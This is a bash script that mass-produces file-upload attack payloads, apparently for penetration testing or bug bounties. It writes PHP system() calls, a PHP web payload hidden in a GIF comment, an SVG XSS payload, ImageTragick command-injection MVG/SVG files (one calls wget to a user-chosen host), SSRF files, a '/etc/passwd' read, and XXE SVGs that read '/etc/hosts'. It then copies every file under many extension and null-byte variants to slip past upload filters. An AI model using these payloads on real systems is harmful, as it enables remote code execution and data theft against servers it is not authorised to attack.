#!/bin/bash

DATE=$(date +"%d-%b-%Y")

# https://convertcase.net/
FORMAT=( 7z asp aspx avi bat bin bmp bz2 cfg cgi csv doc docx exe flv gif gz htm html ini jpeg jpg js jsp mid mov mp3 mp4 mpa mpg ods odt pdf pem php php3 php4 php5 phps phpt png ppt pptx psd rar raw rtf svg tar tgz tif tiff txt vob wav wma wmv xcf xhtml xls xlsx xml xz zip zipx 7Z AsP AsPx aVi bAt bIn bMp bZ2 cFg cGi cSv dOc dOcX ExE FlV GiF Gz hTm hTmL InI JpEg jPg jS JsP MiD MoV Mp3 Mp4 MpA MpG OdS OdT PdF PeM PhP PhP3 pHp4 PhP5 pHpS PhPt pNg pPt pPtX PsD RaR RaW RtF SvG TaR TgZ TiF TiFf tXt vOb wAv wMa wMv xCf xHtMl xLs xLsX XmL Xz zIp zIpX )

EXTRACHAR=( .. -- - _ = + \~ [ ] \* ^ % $ ? , @ %00 )

KEY64=$(echo "$NAME.$(date +'%d-%b-%Y-%T').$(echo $RANDOM)" | base64 | sed 's/=//g')


# Ask the user what they would like to name this.
echo "what would you like to name this?"
read NAME

# Ask the user what website they are making this for.
echo "what website would you like everything to ping?"
read SITE

# use variable to make folder
mkdir $NAME
mkdir $NAME/$DATE

# change directory 
cd $NAME/$DATE



# html-pdf (https://0x00sec.org/t/unrestricted-cv-file-upload/20325)
mkdir $NAME-html-pdf
cd $NAME-html-pdf

cat <<EOF > html.pdf
%PDF-1.
<html>
<script src=$KEY64.html-pdf.$SITE></script>
</html>
EOF



# php
cd ..
mkdir $NAME-php
cd $NAME-php

cat <<EOF > ping.php
<?php
system("ping -c 1 $KEY64.php.$SITE");
?>
EOF



# C++ if loaded in visual studio it should reach out to my site. https://twitter.com/dildog/status/1353931717321449472
#cd ..
#mkdir $NAME-CPP
#cd $NAME-CPP

#cat <<EOF > ping.CPP
# include "\\$KEY64.CPP.$SITE\foo.h"
# include "\\$SITE\foo.h"
# include "\\<IP-Address>\foo.h"
# include "\\a.b.c.d\foo.h"
#EOF



# python
cd ..
mkdir $NAME-python
cd $NAME-python

cat <<EOF > ping.py
import os
import platform
current_os = platform.system().lower()

if current_os == "windows":
    parameter = "-n"
else:
    parameter = "-c"

os.system("ping " + parameter +" 1 -w2 $KEY64.python.$SITE")
EOF

cat <<EOF > __main__.py
import os
import platform
current_os = platform.system().lower()

if current_os == "windows":
    parameter = "-n"
else:
    parameter = "-c"

os.system("ping " + parameter +" 1 -w2 $KEY64.zippy.$SITE")
EOF

zip ping.zip __main__.py

echo '#!/usr/bin/env python' | cat - ping.zip > ping
chmod 755 ping



# shell code
cd ..
mkdir $NAME-shell
cd $NAME-shell

cat <<EOF > ping.sh
ping -c 1 $KEY64.shell.$SITE
EOF

chmod +x ping.sh



# perl
cd ..
mkdir $NAME-perl
cd $NAME-perl

cat <<EOF > ping.pl
#!/usr/bin/perl
use strict;
use warnings;
use 5.010;

use Net::Ping;
my $p = Net::Ping->new();
$p->ping('$KEY64.perl.$SITE');
$p->close; 
EOF



# gifsicle 
cd ..
mkdir $NAME-gifsicle
cd $NAME-gifsicle

wget https://gifgifmagazine.com/wp-content/uploads/2017/09/ping-pong-macke.gif

gifsicle -c "<?php system('ping -c 1 $KEY64.gifsicle.$SITE'); ?>" < ping-pong-macke.gif > gifsicle-ping.php.gif

# check to make sure the comment is correct
# gifsicle -I gifsicle-ping.php.gif

gifsicle -c '<?php echo "Current PHP version: " . phpversion(); ?>' < ping-pong-macke.gif > gifsicle-output.php.gif
rm -f ping-pong-macke.gif 

# Xss Payload: https://www.exploit-db.com/exploits/49437
cd ..
mkdir $NAME-XSS-SVG
cd $NAME-XSS-SVG

cat <<EOF > XSS-SVG.svg
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg

onload="alert('XSS')"
 xmlns="http://www.w3.org/2000/svg">
</svg>
EOF











# gifs need work. these cut off the actual command after: 'https://127.0.0.1/x.php?x='

cd ..
mkdir $NAME-gif
cd $NAME-gif

cat <<EOF > wget.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='wget -O- $KEY64.gif.$SITE > /dev/null'"
pop graphic-context
EOF

cat <<EOF > ping-unix.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='ping -c 1 $KEY64.unixgif.$SITE'"
pop graphic-context
EOF

cat <<EOF > ping-win.gif
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 "https://127.0.0.1/x.php?x='ping -n 1 $KEY64.wingif.$SITE'"
pop graphic-context
EOF




# test and work on this
# ImageTragic
cd ..
mkdir $NAME-ImageTragic
cd $NAME-ImageTragic

# exploit.mvg
cat <<EOF > exploit.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url($KEY64.ImageTragic.MVG.$SITE/image.jpg"|ping -c 1 $KEY64.ImageTragic.MVG.$SITE)'
pop graphic-context
EOF

# exploit2.mvg
cat <<EOF > exploit2.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
EOF

# exploit.svg
cat <<EOF > exploit.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# test with:
# convert exploit.mvg out.png

# exploit2.svg
cat <<EOF > exploit2.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# ssrf.mvg
cat <<EOF > ssrf.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url($KEY64.ImageTragic.SSRF-MVG.$SITE)'
pop graphic-context
EOF

# test with:
# convert ssrf.mvg out.png # makes http request to example.com

# ssrf2.mvg
cat <<EOF > ssrf2.mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(http://example.com/)'
pop graphic-context
EOF

# file_read.mvg
cat <<EOF > file_read.mvg
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/etc/passwd'
pop graphic-context
EOF



# XXE-Inkscape
cd ..
mkdir $NAME-XXE-Inkscape
cd $NAME-XXE-Inkscape

# XXE1.svg
cat <<EOF > XXE1.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# XXE2.svg
cat <<EOF > XXE2.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

# XXE3.svg http://svn.apache.org/repos/asf/cxf/trunk/security/CVE-2010-2076.pdf
cat <<EOF > XXE3.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE  requestType  [<!ENTITY file SYSTEM "/etc/hosts">]><requestTypexmlns="http://apache.org/hello_world_xml_http/bare/types">&file;</requestType>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF


# XXE4.svg
cat <<EOF > XXE4.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE root SYSTEM "$KEY64.ImageTragic.SVG.$SITE"><root/>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image xlink:href="$KEY64.ImageTragic.SVG.$SITE/image.jpg|ping -c 1 $KEY64.ImageTragic.SVG.$SITE" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF


# XXE5.svg
cat <<EOF > XXE5.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE  requestType  [<!ENTITY file SYSTEM "/etc/hosts">]><requestTypexmlns="http://apache.org/hello_world_xml_http/bare/types">&file;</requestType>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF


# XXE6.svg
cat <<EOF > XXE6.svg
<?xml version="1.0" standalone="no"?>
<!DOCTYPE root SYSTEM "$KEY64.ImageTragic.SVG.$SITE"><root/>
<svg width="640px" height="480px" version="1.1" xmlns="http://www.w3.org/2000/svg"; xmlns:xlink="http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la" x="0" y="0" height="640px" width="480px"/>
</svg>
EOF

#inkscape -e xxe-inkscape.png XXE.svg
#inkscape -e xxe-inkscape2.png XXE2.svg



# for loop to copy files and add %00 at the end of everyfile for nullbyte multi extention. 
cd ..
for dir in $(ls -d */); do cd $dir; for file in $(ls); do for char in ${EXTRACHAR[@]}; do cp $file $file$char; done; done; cd .. ; done

# for loop to make files with added extentions
for dir in $(ls -d */); do cd $dir; for file in $(ls); do for format in ${FORMAT[@]}; do cp $file $file.$format; done; done; cd .. ; done



# List all information to CSV file
# cd ..
echo "Site: $NAME , Date: $DATE , Pingback: $SITE" >> ~/payloads.csv
echo "Payload , Upload Area , Date Uploaded , Date of Response" >> ~/payloads.csv
for dir in $(ls -d */); do cd $dir; for file in $(ls); do echo "$file ,  , $DATE" >> ~/payloads.csv; done; cd .. ; done


